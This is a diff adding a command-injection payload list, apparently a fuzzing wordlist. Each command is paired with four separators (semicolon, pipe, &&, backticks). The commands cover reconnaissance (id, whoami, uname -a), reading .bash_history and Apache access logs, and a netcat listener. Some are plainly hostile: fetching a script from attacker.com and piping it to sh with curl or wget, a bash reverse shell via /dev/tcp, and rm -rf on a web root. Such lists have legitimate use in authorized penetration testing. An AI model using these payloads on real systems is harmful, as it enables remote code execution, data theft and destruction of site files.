@@ -1,0 +1,50 @@
+; ls
+| ls
+&& ls
+`ls`
+; cat /var/www/entertainment/.bash_history
+| cat /var/www/entertainment/.bash_history
+&& cat /var/www/entertainment/.bash_history
+`cat /var/www/entertainment/.bash_history`
+; id
+| id
+&& id
+`id`
+; whoami
+| whoami
+&& whoami
+`whoami`
+; ping -c 4 127.0.0.1
+| ping -c 4 127.0.0.1
+&& ping -c 4 127.0.0.1
+`ping -c 4 127.0.0.1`
+; uname -a
+| uname -a
+&& uname -a
+`uname -a`
+; nc -lvp 1234
+| nc -lvp 1234
+&& nc -lvp 1234
+`nc -lvp 1234`
+; curl http://attacker.com/malicious_script.sh | sh
+| curl http://attacker.com/malicious_script.sh | sh
+&& curl http://attacker.com/malicious_script.sh | sh
+`curl http://attacker.com/malicious_script.sh | sh`
+; wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+| wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+&& wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+`wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh`
+; echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+| echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+&& echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+`echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh`
+; bash -i >& /dev/tcp/attacker.com/1234 0>&1
+| bash -i >& /dev/tcp/attacker.com/1234 0>&1
+&& bash -i >& /dev/tcp/attacker.com/1234 0>&1
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`
+; rm -rf /var/www/entertainment/*
+| rm -rf /var/www/entertainment/*
+&& rm -rf /var/www/entertainment/*
+`rm -rf /var/www/entertainment/*`
+; cat /var/log/apache2/access.log
+| cat /var/log/apache2/access.log
